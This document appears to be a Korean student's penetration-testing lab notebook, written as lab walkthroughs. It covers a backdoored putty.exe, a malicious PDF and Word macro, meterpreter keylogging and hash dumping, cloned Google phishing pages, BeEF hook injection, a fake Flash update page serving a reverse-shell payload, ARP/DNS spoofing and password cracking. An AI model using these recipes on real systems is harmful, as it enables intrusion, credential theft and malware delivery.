+			a.exe는 바이너리로 만들어진 프로그램인데 이 프로그램이 명령어 4개로 구성됐다고 가정한다 
+			이를 실행하면 메모리에 올라가게 된다 이때 최적화라는 작업을 하게 된다. 이 최적화는 2byte단위로 메모리가 빨리 읽을수있도록 바꿔주는것 
+			이때 2byte단위로 짤려서 일정한 크기로 나누게 되면 다 딱맞게 떨어지지 않기 때문에 마지막에 0으로 채워져 null로 채워지게 된다 
+			여기서 null로 생기는 공간을 code cave라 한다.
+			메모리에서 실행을 하다가 중간에 check하는 것이 있으면 원래는 개발자가 만들어놓은 함수로 이동해서 점검을 해야하는데
+			check전에 codecave로 이동해서 codecave를 실행후 check 이후로 리턴값을 바꿔서 프로그램의 루틴을 바꿔 수정할수있다 
+			이렇게 코드를 고쳐서 만든 프로그램을 코드패치이다
+		
+		목적 : 윈도우7에 악성프로그램이 포함된 putty.exe를 설치할것임 
+		(칼리) 
+			# cd 
+			# ls 
+			# cd "다운로드" 
+			# ls 
+			# mkdir -p /test 
+			# cp putty.exe /test 
+			# cd /test 
+			# ls 
+			# file putty.exe
+			# git clone https://github.com/secretsquirrel/the-backdoor-factory.git 
+			# ls 
+			# cd the-backdoor-factory
+			# ls 
+			# ./backdoor.py 
+			# ./backdoor.py -f /test/putty.exe -s show 
+			# ./backdoor.py -f /test/putty.exe -H 192.168.20.50 -P 8080 -s iat_reverse_tcp_stager_threaded 
+				2
+			# ls 
+			# cd backdoored 
+			# file * 
+			# md5sum /test/putty.exe 
+			# md5sum /test/the-backdoor-factory/backdoored/putty.exe 
+			# ls -l /test/putty.exe 
+			# ls -l /test/the-backdoor-factory/backdoored/putty.exe 
+			# cp putty.exe /var/www/html 
+			# service apache2 restart 
+			# msfconsole -q 
+				use exploit/multi/handler
+				set payload windows/meterpreter/reverse_tcp
+				set LHOST 192.168.20.50
+				set LPORT 8080
+				exploit
+		(windows 7)
+			http://192.168.20.50/putty.exe	-> 저장하고 실행하면 세션이 연결되어있음 
+		(KaliLinux)
+				sysinfo 
+				quit
+				quit
+		
+		http://www.virustotal.com -> 에 파일 올려서 검사해보기 
+	
+	[실습] 변조된 PDF 파일 생성하기(CVE-2010-1240)
+		PDF 파일 + reverse_tcp = PDF 파일(reverse_tcp)
+		사전 : windows 7에 Adobe Reader 8.x 버전을 설치 (버그파일을 깔아야함)
+		
+		(칼리)
+			[터미널1]
+			# msfconsole -q 
+				help search 
+				search cve:2010-1240
+				use exploit/windows/fileformat/adobe_pdf_embedded_exe
+				show options
+				set FILENAME story.pdf
+				set PAYLOAD windows/meterpreter/reverse_tcp
+				show options
+				set LHOST 192.168.20.50
+				exploit		-> /root/.msf4/local/story.pdf 에 파일이 만들어졌다고 표시됨
+			안되면
+			# apt-get -y install metasploit-framework				
+			[터미널2]
+			# cd /root/.msf4/local 
+			# ls
+			# cp /root/.msf4/local/story.pdf /share 
+			[터미널1]
+				use exploit/multi/handler
+				set payload windows/meterpreter/reverse_tcp
+				set LHOST 192.168.20.50
+				exploit
+		(윈7)
+			story.pdf 파일을 다운로드
+			\\192.168.20.50\share\storey.pdf -> 바탕화면에 복사
+			story.pdf 파일 우클릭 후 <연결 프로그램>
+			Adobe Reader 8.0을 선택
+			<저장>
+			<열기>
+		(칼리)
+				sysinfo 
+				quit
+				quit
+	
+	[실습] MS Word 악성코드 
+		사용시스템 : 칼리, 윈7 
+		시나리오   : 칼리에서 악성코드 제작 (.vba기반 reverse_tcp) vba : 비주얼베이직에서 돌아가는 프로그램, listener 기동
+					 윈도우에서 ms워드를 열어 내용을 만든다
+					 vba 코드를 macro 기능으로 추가하고 저장(.docm)한다 원래는 docx인데 매크로는 docm임 
+					 그리고 ms word 파일을 실행하면 reverses_tcp 가 동작하면서 kali 리눅스와 세션을 연결 
+		(칼리)
+			# msfconsole -q
+				use windows/x64/meterpreter/reverse_tcp
+				set lhost 192.168.20.50
+				set lport 4444
+				generate -h
+				generate -t vba	-> 하고 내용을 다 복사 
+			# vi /share/marware.txt 에 내용을 넣기 
+			# cd /root/bin
+			# cat <<EOF > marware.rc		-> 리소스 파일 생성
+				> use exploit/multi/handler
+				> set payload windows/x64/meterpreter/reverse_tcp
+				> set lhost 192.168.20.50
+				> set lport 4444
+				> set exitsession false
+				> exploit -j -z
+			# msfconsole -r marware.rc
+		(윈7)
+			공유디렉토리에서  ms_office.zip 설치한다 !
+			ms워드 실행 -> 아무내용 작성 -> 상단에 보기 -> 오른쪽위에 매크로 -> 매크로이름 : malware -> 매크로위치 -> 문서 1 -> 만들기
+			-> 위에서만든 marware.txt안에 있는 내용을 복사해서 붙여넣기 -> 왼쪽 상단 저장 -> 형식을 word매크로 사용문서로 이름은 : marware.docm 로 저장
+			-> 워드를 다 종료하고 -> 파일을 클릭 (해당 파일은 인터넷에서 받은 파일이라고 가정한다.) -> 위에 사용못하게막아두었다. -> 사용하기
+		(칼리)
+			# sessions -i 1 -> 연결완료 
+			
+	[참고] 문서형 악성코드
+		* PDF 파일 + 악성코드
+		* MS Office 파일 + 악성코드 (macro)
+		* etc
+	
+	[실습] 키보드 스니핑과 스크린샷 = Key Logger
+		사용시스템 : 칼리, 윈2008
+		키보드에 a를 누르면 키보드 내용이 저장되는 buffer에 저장이 된다  
+		윈도우 데스크탑에는 해당 데스크탑 마다 각각의 키보드 버퍼를 가지고있다 이러한 키보드 버퍼는 winsta0->dafault(모든 app과 데스크탑에서 수행되는 작업들) 에 중요한 정보가 있어 여기서 수행해야 정보를 쉽게 얻을 수 있다
+		
+		(칼리)
+			# msfconsole -r reverse_resource2.rc	-> 윈도우에서 백도어 프로그램 사용 
+			# sessions -i 1
+				help 
+				enumdesktops 		-> 접근가능 데스크탑 목록 보여줌
+				getdesktop			-> 현재 메타프리터 데스크탑을 가져옴
+				keyscan_start 		-> 키보드 캡쳐 시작 
+				keyscan_dump 		-> 캡처한거 보여줌 
+				keyscan_stop 		-> 멈추기
+				screenshot 			-> 캡처
+				
+	[실습] password the hash(hash dump)
+		이유 : windows 2008 서버의 사용자 암호를 쉽게 설정한 후 암호를 크랙하여 보자
+		사용시스템 : KaliLinux windows 2008
+		선수작업 : 비밀번호 123으로 바꾸기 
+		(칼리)
+			# cd /root/bin ; msfconsole -r reverse_resource2.rc  
+		(윈도우)
+			backdoor.exe 파일 실행
+		(칼리)
+				sessions -l
+				sessions -i 1
+				help 
+				getuid 
+				getsystem 
+				getuid 
+				hashdump 	-> 해시값을 볼 수 있다  
+				exit
+				exit
+	
+		[참고] SAM파일로 추출된 패스워드 해시를 크랙하는 대표적인 툴
+			존 더 리퍼 : LINUX/UNIX + WINDOWS 패스워드 크랙 툴
+			카인 과 아벨 : WINDOWS 패스워드 크랙 툴
+			기타(pwdump, rainbow crack) 등 
+			
+			암호화 알고리즘을 크랙
+			LINUX / UNIX : /etc/shadow에 첫번째 $ 에는 암호화 알고리즘(MD5, SHA256, SHA512)
+							두번째 $에는 salt값 
+							세번째 $은 암호 
+							따라서 암호화알고리즘을 알고있으면 여러개를 넣어서 해시출력값과 비교함 
+							결론은 SALT키를 이용해 암호크랙을 방지함
+			WINDOW		 : 윈도우는 해시알고리즘 방식으로 LM과 NTLM방식을 사용한다 
+							LM은 A를 넣었을때 SALT값없이 출력값을 다시한번 LM에 넣어서 출력값가지고 인증을함 
+							이는 몇번 돌렸는지 예약함 따라서 매우 취약 
+							NTLM은 몇번 돌렸는지 안알려줌 그래서 그나마 괜찮음 
+						
+			레인보우 어택 : 윈도우에서 비밀번호를 돌리면 해당 돌린 비밀번호를 계속 가지고있는다 그걸 테이블로저장
+							그래서 그 테이블이 매우 커지면 언젠간 비밀번호를 찾게됨 
+		
+		(원본)
+			http://www.hashkiller.co.uk/ 사이트에 접속한다 
+			상단 -> ntlm cracker 대상이 윈도우이기 때문에 NTLM선택 -> 크랙 완료 
+		
+	[참고] MSF interface 
+		(ㄱ) (TUI) console(msfconsole CMD)
+		(ㄴ) (TUI) CMD(msfvenom CMD)
+		(ㄷ) (GUI) Armitage이거사용해봄, msfgui기능미흡, msfweb이건안됨
+	
+	[실습] Armitage 툴 사용하기
+		사용시스템
+			Metasploitable V2 Linux (192.168.10.134)
+			Windows7 (192.168.20.100)
+			Firewall (192.168.10.100/192.168.20.100)
+			KaliLinux(192.168.10.50/192.168.20.50)
+		(칼리)
+			# armitage & 
+				help -> homapage -> www.fastandeasyhacking.com -> manual 정보를 읽기
+				Connect 
+				예
+			# cd /usr/share/metasploit-framework
+			# ls 	-> msfrpcd 가있다 이것이 기동되어야 아미티지 사용 쌉가능
+		(아미티지)
+			(왼쪽위에 모듈)
+				msf체계에 붙었으니 msf체계 모듈을 사용 가능 
+				왼쪽 검색에 synfood 하면 위에 뜸 들어가면 기호에 +가 있는게 있는데 이것은 꼭 넣어줘야함 그리고 런치하면 돌아감
+			(오른쪽 위가 타겟)
+				위에 호스트 창에서 호스트 추가 하고 nmap 스캔하고 msf 스캔하고 할수있음 -> nmpa 스캔 -> quick scan(os detect) -> 192.168.10.0/24 검색
+				134번 우클릭 -> services -> 사용하는 서비스 나옴 
+				134번 우클릭 -> scan -> 다시 스캔하는 작업을 함 
+				134번 우클릭 -> login -> ftp -> 대기
+		(메타스플로잇)
+			$ sudo useradd -m -s /bin/bash user1
+			$ sudo passwd user1
+		(아미티지)
+			user1
+			user1 으로 접속
+			134번 우클릭 -> host -> operating system -> 안드로이드로 바꾸기 -> 해당 아이콘이 바뀜 
+			134번 우클릭 -> host -> set label -> metasploit Version 2 -> 이름이 바뀜 
+			(맨 밑 탭창) -> 똑같이 사용할 수 있음 
+				search synflood 
+				use auxiliary/dos/tcp/synflood
+				show options
+				set RHOSTS 192.168.10.134
+				show options
+		(아미티지)
+			위에 호스트 -> nmap -> quick scan (os dected) -> 192.168.20.0/24
+			134 번 우클릭 -> 서비스 -> 살펴봄
+		(칼리)
+			# wireshark &
+				eth0 잡기 
+				!dns && !arp && ip.addr==192.168.10.134 && !browser && !nbns	-> 필터링 작성
+		(아미티지)
+			위에 armitage -> preferences -> 5번째 마지막꺼 poor로 바꾸기 
+			134번 우클릭 -> host -> operating system -> 리눅스로 바꾸기 -> 해당 아이콘이 바뀜 
+			위에attack -> find attack -> 하기 -> 우크릭하면 어택이 생김 : 
+				파인드 어택은 해당 서버에 공격을 할만한 코드들을 검색하는 것이다 공격은 아님 따라서 패킷에 안잡힘
+			우클릭 -> attack -> 여러 메뉴가 나옴 -> 아무거나선택 -> ftp -> check exploits : 
+				해당 ftp에 취약점(목록)에 대하여 점검작업을 함 이 점검작업은 check라는 함수가 코드마다 있는데 이는 
+				run과 다르다 check는 포트를 요청하면 상대편이 배너메시지를 주어 버전을 알게 되는 것이다 따라서 공격 가능성을 보는것
+				run은 공격을 하는것이다 run을하면 check를 돌리고 공격을 하는것이다 차이점이 있다!
+			우클릭 -> attack -> 여러 메뉴가 나옴 -> 아무거나선택 -> telnet -> check exploits : 
+			위에attack -> Hail Mary 는 findattack로 목록화를 시킨것을 가지고 어택하는 전체 메뉴 실행시켜 보는것이다 
+			하고나면 뚫림 번개 모양이 침
+			134 우클릭 -> shell -> 연결이 가능하다 -> interact 대화형, upload 파일업로드, post modules 모듈선택 -> interact선택 
+		(윈7)
+			IE 8 이하 버전 사용
+			IE 보안 설정이 낮음으로 설정된 상태
+		(아미티지)		
+			ms11_003_ie_css_import 선택후 -> 런치 
+				(예) http://192.168.10.50:8080/WcvnEB44pNCxq -> 이렇게 나온다 
+		(윈7)
+			http://192.168.10.50:8080/WcvnEB44pNCxq 에 검색
+		(아미티지)
+			쉘을 따냄 오른쪽 마우스 > Meterpreter 1/2 > Interact Explore > Screeshot
+
+
+2장 SET(Social Enginnering Technology)			
+	SET : 비기술적 침입수단
+	사회공학적 기법을 사용한 공격의 분류 : 인간기반, 컴퓨터기반(악성코드), 악성코드기반(봇넷,스팸메일)
+	* 악성코드(애드웨어 : 광고뜨기, 스파이웨어 : 정보빼가기)
+	
+	settoolkit Attack
+		Spear-Phishing Attack Vectors: 
+		Website Attack Vectors: 				:	웹 어택에 관한 공격 fake site 
+		Infectious Media Generator: 			: 	의심스러운 악의적인 미디어 생성
+		Create a Payload and Listener: 		:	리버스tcp생성하고 돌리기
+		Mass Mailer Attack: 					:	대량 메일 보내기 
+		Arduino-Based Attack Vector: 		:	아두이노 사용해서 공격
+		Wireless Access Point Attack Vector:	:	무선 ap 공격
+		QRCode Generator Attack Vector		:    qr코드
+		Powershell Attack Vectors			:	파워쉘을 통해서 공격 리버스쉘과 달리 이는 찾기가 매우 어려움 정상 동작하기 때문
+		SMS Spoofing Attack Vector			:	문자 속이기 
+		Third Party Modules					:	타 회사 벤더 제품 쓰기 
+	
+	# apt-cache search set | grep '^set'	업데이트하는것
+	
+	[실습] Fake Google WEB Site 구성 - ID/PASS 모으기 위한 설정
+		사용시스템 : Kali Linux, Windows 7
+		(칼리)
+			# setoolkit
+			y
+			1) : 하나씩실행
+			2) : 1번역할을 한번에 실행
+			3) : 다른 모듈 사용
+			4) : 버전 업데이트
+			5) : 설정파일 업데이트 
+				1번 실행
+				2번 실행 (Credential : 아이디패스워드)
+				3번 실행
+				1번 실행 
+				192.168.20.50	-> 이후 설정 정보를 보여줌
+				2번 실행 
+				enter 			-> 수집중인것을 보여줌 
+				y
+				-> 파일들이 /var/www/html 밑에 만들어지지 않는다 그냥 새롭게 띄어주는거일뿐 
+		(윈7)
+			firefox 에서 192.168.20.50 들어감
+			구글에 아이디 비번 치기
+		(칼리)
+			cd ~/.set 에 파일들이 있다!
+				
+		
+	[실습] 추가적인 실습
+		(칼리)
+			# setoolkit
+			y
+			1) : 하나씩실행
+			2) : 1번역할을 한번에 실행
+			3) : 다른 모듈 사용
+			4) : 버전 업데이트
+			5) : 설정파일 업데이트 
+				1번 실행
+				2번 실행 (Credential : 아이디패스워드)
+				3번 실행
+				1번 실행 
+				192.168.20.50	-> 이후 설정 정보를 보여줌
+				http://www.seoul.ac.kr/index.html
+				enter
+				
+	[실습] Fake Google WEB Site 구성(Java Applet Attack(악성 프로그램 유포))
+		(칼리)
+			# setoolkit
+			y
+			1) : 하나씩실행
+			2) : 1번역할을 한번에 실행
+			3) : 다른 모듈 사용
+			4) : 버전 업데이트
+			5) : 설정파일 업데이트 
+				1번 실행
+				2번 실행 (Credential : 아이디패스워드)
+				1번 실행
+				1번 실행 
+				no			-> 칼리리눅스는 웹서버 이면서 중간자 역할 여기서는 no 페이크웹사이트가 떨어져있으면 yes를해서 포트포워딩으로 연결을 시켜준다 
+				192.168.20.50	-> 이후 설정 정보를 보여줌
+				2
+				2
+				1
+				enter		-> 미리포트를 쓰고 있으면충돌남 
+				1
+		(윈7)	-> 자바가 꼭 설치되어있어야함 위에서 자바 애플릿 으로 사이트를 만들었기 때문이다.
+			시작 -> 자바 구성 -> 보안탭 -> 보안레벨 높음 -> 예외사항 사이트목록 -> 추가 -> 
+				http://192.168.20.50, https://192.168.20.50 두개 추가 
+			시작 -> 64비트 IE 실행 -> 상단 바 -> 도구 -> 인터넷 옵션 -> 보안탭 -> 일반(빈페이지설정) -> 보안(낮추기), 사용자 지정 기타에 팝업 차단 사용 에서 사용안함
+		(칼리)
+			# msfconsol -q 
+				msf> use exploit/multi/handler
+				msf> set payload windows/x64/meterpreter/reverse_tcp
+				msf> set LHOST 192.168.20.50
+				msf> set LPORT 443
+				msf> exploit
+		(윈7)
+			192.168.20.50 하고
+			위험 감수하고 계속하면 칼리와 연결이 된다 
+		(칼리)
+			# cd ~/.set
+			# cd web_clone
+			# cp -p rvzcQydHXysBK.jar /test
+			# cd /test
+			# jar xvf rvzcQydHXysBK.jar		-> 컴파일된 소스코드가 있음 
+			# jad Java.class				-> 파일을 디컴파일함 
+			# ls
+			# cat java.jad				
+	
+	[실습] 이메일을 통해 속이는 작업(스팸 메일 - 링크 사이트)
+		# cd /etc/setoolkit
+		# ls etc/setoolkit# 
+		# vi set.config 
+			[수정전]
+			WEBATTACK_EMAIL=OFF
+			[수정후]
+			WEBATTACK_EMAIL=ON
+		# setoolkit
+			1
+			5	
+			1
+			a01033493621@gmail.com
+			a01033493621@gmail.com
+			ohseongtaek
+			실제 비밀번호 
+			no
+			no
+			쓰기아무거나
+			enter
+			아무거나 쓰고 마지막에 END	->	보냈지만 구글에서 필터링을 해버림 
+			
+
+3장 Beef-XSS (웹 브라우저 해킹)
+	
+	클라이언트 언어 : HTML, Javascripts, etc -> Javascripts 가 많이 씀  
+	서버 언어		: PHP
+	
+	XSS 공격 : 여러 스크립트를 이용해 게시판에 등록해서 의도하지 않은 기능으로 작동시키는 기술 
+		쿠키를 이용한다.
+	
+	XSS 공격 종류
+		Reflected XSS : 검색창에 스크립트 코드를 넣는다 서버에서는 그 코드를 검색해서 그 검색결괄르 보여준다 
+			ex : <script> alert('hello') </script>	-> xss 공격가능 판단 할 때 해보는것 
+		Stored XSS : 서버에 저장하는방식이라 영구적이고 공격은 반사가아니라 이를 통해서 공격한다 
+			
+	[실습] 칼리 리눅스 사용하기(웹 브라우저 해킹)
+		(칼리)
+			# beef-xss 하면 -> 해당 툴에 웹UI가 나옴 
+				ID : beef PASS : beef
+			# cd /var/www/html
+			# rm -rf /var/www/html/*
+			# vi index.html
+				<HTML>
+				<BODY>
+				<CENTER><H1> It works! </H1></CENTER>
+				<script src="http://192.168.20.50:3000/hook.js"></script>	-> src를 이걸로 한다 해당 아이피에 3000포트에 hook.js라는 스크립트 파일소스를 띠어 놓으면 클라이언트가 보게 되었을때 이것도 실행이 된다.
+				<P>This is the default web page for this server.</P>
+				<P>The Web Server software is running but no content has been added, yet.</P>
+				</BODY>
+				</HTML>
+			# systemctl restart apache2
+			# systemctl status apache2
+		(윈7)
+			크롬 다운로드 
+			http://192.168.20.50
+			f12 눌러서 개발자 모드 보기
+		(칼리)
+			beef 사이트에 붙은걸 확인
+				details 			:	상세 정보를 보여줌
+				log				: 	기록
+				commands		:	브라우저에 명령을 할수잇음 
+					-> social engineering ( 색 표시가 나옴 맨 위 탭에 getting started 에 설명이 나옴 )
+							녹색	: 사용자가 그 모듈의 작동을 알아채지 못할 것이라는 뜻이다.
+							노란색	: 경고 메세지 상자 등을 통해서 사용자가 공격을 알아 챌 수 있음을 뜻한다.
+							빨간색	: 해당 공격이 작동할 가능성이 낮음을 뜻한다.
+							회색	: 대상 구성에 대해 해당 공격이 작동한다고 확인된 적이 없음을 뜻한다.
+					-> google phishing ( 오른쪽 하단에 실행 누르면 해당 페이지를 보낸다 클라이언트한테 )
+		(윈7)
+			페이지가 바뀐것을 확인 
+			다시 한번 요청 ( 계속 유지되지 않기 때문에 할때마다 192.168.20.50요청)
+		(칼리)
+			Commands 탭 > Module Tree > Browser > Hooked Domain > Redirect Browser ( Redirect Browser 부분에 http://www.google.com 입력 )
+			실행하면 바로 옮겨짐 
+	
+	[실습] BeFF에서 MSF 불러들이기
+		개요 : BeEF와 MSF 사용하여 브라우저 해킹을 시도하고 원격 쉘을 얻는 과정을 이해해 보자.
+		작업 : 방화벽 끄기
+			  자바 설정
+				http://192.168.20.50http://192.168.20.50:8080 https://192.168.20.50사이트를 신뢰할 수 있는 사이트로 등록
+		(칼리)
+			터미널1
+				# vi /usr/share/beef-xss/config.yaml 			-> beef의 설정파일임 ( 156 번째 metasploit 의 사용을 true로 하기 )
+				# cd /usr/share/beef-xss/extensions/metasploit  -> 메타스플로잇의 자세한 설정은 여기서함
+				# vi config.yaml 								-> 윗줄에 설명을 읽어서 사용하기 
+			터미널2
+				# msfconsole -q
+					load msgrpc Pass=abc123					-> Pass=abc123 주지 않으면 msgrpc plugin을 실행할때 마다 랜덤하게 암호가 변경이 된다. 
+			터미널1
+				beef-xss 는 2가지의 툴을 사용한다 UI와 기본 터미널 툴
+				# cd /usr/share/beef-xss
+				# ./beef -x										-> msf체계에 붙어서 정보를 가지고 온다 beef-xss 의 터미널창
+			터미널3
+				# vi /var/www/html/index.html
+					<html>
+					<title> Pentesting</title>
+					<head> Penetration testing with Kali Linux </head>
+					<body>
+					<script src="http://192.168.20.50:3000/hook.js"></script>
+					<img src="http://d.ibtimes.co.uk/en/full/1427093/anonymous-isis-bitcoin-opisis.jpg?w=736">
+					</body>
+					</html>
+			터미널4
+				# firefox http://www.google.com &
+				구글에 anonoymous 검색 -> 이미지만 보기 -> 적당한 그림 골라서 위치 복사후 뒤에 .jpg 붙여서 확인해보기
+			터미널3
+				위에 img src 부분에 해당 이미지 파일 위치 붙여넣기
+				# systemctl restart apache2 
+				# systemctl status apache2
+			터미널4
+				# firefox http://192.168.20.50:3000/ui/panel & 	-> beef-xss 의 UI창 띄우는것 
+		(윈7)
+			크롬에서 192.168.20.50 하면 이미지가 나오고 칼리의 UI에서 정보를 확인가능
+		(칼리)
+			UI의 Current Browser 에 Metasploit 에 600개 정도의 공격 코드가 있는걸 볼 수있음 
+			아미티지에서 사용했던 것처럼 해당 msf_ms11_003 을 공격코드로 이용해서 똑같이 사용이 가능하다 
+			
+			터미널2
+				용어 : autopwn								->	버그가 있는 여러 인터넷창(크롬,파이어폭스,IE) 등등을 엄청 만들어놓고서 여러개를 띄어놓고 클라이언트가 접속을하면 클라이언트의 정보를 판단할수있기 때문에 해당 버전의 취약점을 알아 취약점에 연결을 해준다
+					search autopwn
+					use auxiliary/server/browser_autopwn2
+					show options
+					set srvhost 192.168.20.50
+					set srvport 8080
+					set uripath /
+					show options
+					exploit		-> 	여러 사이트들이 만들어 지고 백그라운드에서 돌고있는것을 확인 한다 
+					jobs
+			터미널1
+				Commands 탭 > Module Tree > Browser > Hooked Domain > Redirect Browse
+					http://192.168.20.50:8080	-> 실행
+					세션이 연결은 안됨 버그판이아니여서
+		(윈7)
+			IE로 192.168.20.50 로붙음
+		(칼리)
+			왼쪽 탭에서 Online Browsers 에서 위와 똑같은 방향에서 하면 세션이 연결됨 크롬은 최신버전이라 안됨
+			
+			요약 : 일단 msf와 연동해서 클라이언트가 들어오면 beef를 이용해 정보를 가지고 msf를 이용해서 해당 인터넷의 취약점을 autopwn으로 목록을 만들어 beef를 이용해 이상한 포트와 아이피로 리다이렉트를 보내 msf에서 리슨상태로 돌고있던곳에 붙는다
+		
+	[실습] Fake Update Site 구축(Fake Adobe Flash 업데이트 사이트 구축)
+		악성코드제작 -> 페이크사이트 제작 -> 플래시 업데이트창화면에서 업데이트 누르면 악성코드 실행 
+		(칼리)
+			터미널1
+				# cd /var/www/html 
+				# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.50 LPORT=4444 -f exe -o payload.exe 
+				# file payload.exe
+			터미널2
+				# msfconsole -q
+					load msgrpc Pass=abc123 
+			터미널1
+				# cd /usr/share/beef-xss 
+				# ./beef -x
+			터미널2
+					use exploit/multi/handler
+					set payload windows/meterpreter/reverse_tcp 
+					set LHOST 192.168.20.50
+					exploit 
+			터미널3
+				# vi /var/www/html/index.html 
+					<DOCTYPE html>
+					<html>
+					<head>
+					<title>Adobe flash</title>
+					<script src="http://192.168.20.50:3000/hook.js"></script>
+					</head>
+					<body><center>
+					<img src="adobe.jpg" alt="adobe" width="204" length="204">
+					<p>
+					<input type="button" name="btnDownload" value="Update" onclick="window.open('payload.exe','download') return false;"/>
+					</p>
+					</body>
+					</html>
+			터미널4
+				# firefox http://www.google.com -> adobe flash palyer -> 이미지 큰거 아무거나 선택 -> save image add -> 위치는 /var/www/html/여기에
+				크기를 1920 1080 이라서 이미지 크기를 소스코드에서 맞춰주기 
+			터미널3
+				# service apache2 restart 
+				# service apache2 status 
+				# firefox http://192.168.20.50:3000/ui/panel & 	UI실행
+		(윈7)
+			크롬을 이용해 192.168.20.50 들어가기 
+			업데이트 화면을 띄우기위한 설정
+				chrome://settings/ > 맨밑에 고급 설정 표시 > 개인정보 -> 동기화 및 GOOGLE 서비스 -> 세이프 브라우징(사용자와 사용자의 기기를 위험한 사이트로부터 보호) 끄기
+				-> 껏다 키기 브라우저 
+		(칼리)
+			beef UI를 보면 Online Browsers 에 붙은걸 확인
+				commands -> social engineering -> fake flash update -> image 부분 http://192.168.20.50:3000/adobe/flash_update.png 이걸로 바꿔주기 
+				아까 msfvenom을 통해서 만든 payload가있어서 payload url 에 http://192.168.20.50/payload.exe 넣기 
+		(윈7)	
+			플래쉬 업데이트 화면이 나온것이 보인다 (하지만 이건 악성코드다)	-> install 
+			실행
+		(칼리)
+			아까 msfconsole 만들어놓은곳에 세션이 연결된것을 확인 
+	
+	[실습] Fake Site 구성(제한 시간: 30분)
+		설정 : 
+			DNS Spoofing/Arp Spoofing : ettercap
+				+
+			Fake Web Site : SETookit(실습2)
+				+ 
+			문자메세지/메일 보내기: SETookit
+		
+			(실습 시스템)
+			Victim system : windows 7(192.168.20.202)
+			Attack system : KaliLinux(192.168.20.50)
+			Router : firewall.example.com(192.168.20.100)
+		
+			(windows 7 system) 결과 확인
+			http://www.google.com -> http://192.168.20.50/(악성코드)
+		
+		순서 : 
+			1. arp spoofing		->  ettercap
+			2. fake web site		->  setoolkit
+			3. dns spoofing 	->  ettercap
+		
+		조건 : 
+			www.daum.net 치면은 페이크사이트인 www.google.com이 나옴 
+	
+		실습
+			1. fake web site 구성	-> 기본적으로 웹으로 동작할 것이라 기존 apach2 를 내린다 (확인 : netstat -antp | grep :80 , 내리기 : service apache2 stop)
+				(칼리)
+					# setoolkit
+						1번 -> 소셜 엔지니어링 공격
+						2번 -> Website Attack Vectors
+						3번 -> Credential Harvester Attack Method	아이디 비번 수집하는 걸로 만든것 
+						1번 -> Web Templates
+						192.168.20.50
+						2번 -> google	-> 하면 되지만 이메일이 열려있으면 이메일도 설정해줘야함 
+				(윈7)
+					크롬에서 192.168.20.50	해서 접속해보기 
+			
+			2. arp spoofing, dns spoofing 
+				(칼리)
+					# cd /etc/ettercap 
+					# ls 
+					# vi etter.dns
+						www.daum.net	A	192.168.20.50
+						*.daum.net	A	192.168.20.50
+						www.daum.net	PTR	192.168.20.50
+					# ettercap -G &
+						-> sniff -> 첫번째 -> eth1번 잡기 
+						-> host -> Scan for hosts -> host -> host list ( 100과 202번이나옴 )
+						-> 100번 타겟 1
+						-> 202번 타겟 2
+						-> mitm -> arp poisonig 
+						-> plugins -> dns_spoof
+						-> start -> start sniffing 
+				* 이더캡 안될때
+					# arpspoof -i eth1 -t 192.168.20.100 192.168.20.202
+					# arpspoof -i eth1 -t 192.168.20.202 192.168.20.100
+					# echo "192.168.20.50 www.daum.net" > daum.txt 	다음요청했을때 아이피요청해줌 
+					# dnsspoof -i eth1 -f daum.txt 
+				(윈7)
+					cmd -> ipconfig /flushdns
+					www.daum.net -> 구글이 켜짐 -> 아디비번치기
+				(칼리)
+					아이디와 비밀번호 가 수집이 됨 
+
+	(정리) Framework
+		MSF 	  -> 모의해킹
+		setoolkit  -> SET
+		Beef-XSS  -> Broswer 모의해킹
+		
+4장 암호크랙
+	크랙 종류 : 추측,  기본암호사용, 사전파일, 무작위대입, 하이브리드 
+	암호 크랙 종류 
+		offline : John The Ripper
+		online : Hydra 
+	
+	[실습] john 명령어를 이용한 로컬 암호 크랙
+		# cat /etc/passwd 
+		# cat /etc/shadow 
+		# md5sum /etc/passwd
+		# sha512sum /etc/passwd
+		# useradd -m -s /bin/bash user01 ; passwd user01 
+			user01,	user01
+		# useradd -m -s /bin/bash hacker ; passwd hacker
+			h4ckEr1. h4ckEr1.
+		# cd /root/bin 
+		# unshadow /etc/passwd /etc/shadow 
+		# unshadow /etc/passwd /etc/shadow | egrep '(^root|^user01)' > passwd.txt 
+		# unshadow /etc/passwd /etc/shadow | egrep '(^root|^user01|^hacker)' > passwd2.txt 
+		# cat passwd.txt
+		# cat passwd2.txt
+		# john passwd.txt
+		# john passwd2.txt
+		# cd ~/.john
+		# cat john.pot
+		# john --show passwd2.txt
+		# john --show=LEFT passwd2.txt 
+	
+	[실습] johnny 툴을 이용한 로컬 암호 크랙
+		# johnny
+			-> open password file -> passwd2.txt 파일 -> start new attack 실행
+			-> options -> 해시포맷을 확인가능 -> 모드 선택 가능 
+			-> 이런거 돌릴때 로컬에서만 하지말고 웹사이트를 이용해 병렬처리로 속도를 올리는게 좋음 
+	
+	[실습] xhydra를 이용한 원격 암호 크랙 
+		(작업 시나리오)
+			(KaliLinux(hydra)) --- password crack ---> (Metasploitable V2 Linux(ftpd))
+		(칼리)
+			# nmap -sV -F 192.168.10.134
+		(메타)
+			$ sudo useradd -m -s /bin/bash user1
+			$ passwd user1
+				user1	user1
+			$ ftp localhost 21
+		(칼리)
+			구글에 inurl:github fuzzdb			-> 사전파일 검색
+			# cd /usr/share/wordlists/ ; ls -l	-> 사전파일들
+			직접제작!							-> crunch CMD
+			
+			# crunch -h
+			# crunch 1 3 
+			# curnch 1 3 'a1 ' 	3개조합을 1과 a와 공백으로 만듬 	-> 사전파일 생성은 윈도우에서 하는게 더 좋은것같다.
+				사전파일을 합치는 순서
+					1. 기본 패스워드
+					2. 인터넷상에서 구한 공유기 관련 ID/PASS의 모음
+					3. 자신이 만든 사전 파일 순으로 점검을 해야함 
+			
+			# crunch 1 5 user1 > user.list 
+			# xhydra & 
+				Target 탭
+					Target
+					single target : 192.168.10.134
+					port : 21
+					protocol : ftp
+				Output Options
+					[ v ] Show Attempts
+				Passwords 탭
+					Username : user1
+					Password : [ v ] Password list : (사전 파일은 아래 [참고]에서 만들어진 파일 사용)
+				Start 탭
+					왼쪽 하단 부분에 "Start"
+		(메타)
+			$ sudo cat /var/log/vsftpd.log 	확인하면 실패가 나옴 
+	
+	[참고] 강력한 암호라는 것은 어떤것인가?
+		강력한 암호
+			서로 다른 Class 섞어서 사용한다.(EX: Hellow world! 1234)
+			문자(대문자/소문자) + 숫자 + 특수문자 + 공백문자
+			암호의 최소 글자 8자 이상
+	
